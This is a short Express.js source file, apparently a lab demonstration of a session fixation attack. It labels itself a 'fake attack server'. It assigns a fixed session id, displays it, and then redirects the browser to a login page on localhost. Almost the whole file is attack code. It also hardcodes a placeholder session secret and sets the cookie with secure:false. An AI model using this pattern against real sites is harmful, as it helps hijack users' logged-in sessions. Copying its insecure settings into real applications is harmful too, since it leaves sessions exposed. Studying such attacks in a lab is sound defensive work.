const express = require('express');
const session = require('express-session');
const app = express();

app.use(session({
  secret: 'fake_secret_key',
  resave: false,
  saveUninitialized: true,
  cookie: { httpOnly: true, secure: false }
}));

app.get('/set-session', (req, res) => {
    req.session.id = 'fixed-session-id';
    
    // Redirect otomatis ke situs asli
    res.send(`
      <html>
        <body>
          <h1>Session ID set to: ${req.session.id}</h1>
          <script>
            setTimeout(function() {
              window.location.href = 'http://localhost:3000/login';
            }, 2000); // Redirect setelah 2 detik
          </script>
        </body>
      </html>
    `);
  });
  
  
app.listen(4000, () => {
  console.log('Fake attack server running on port 4000');
});
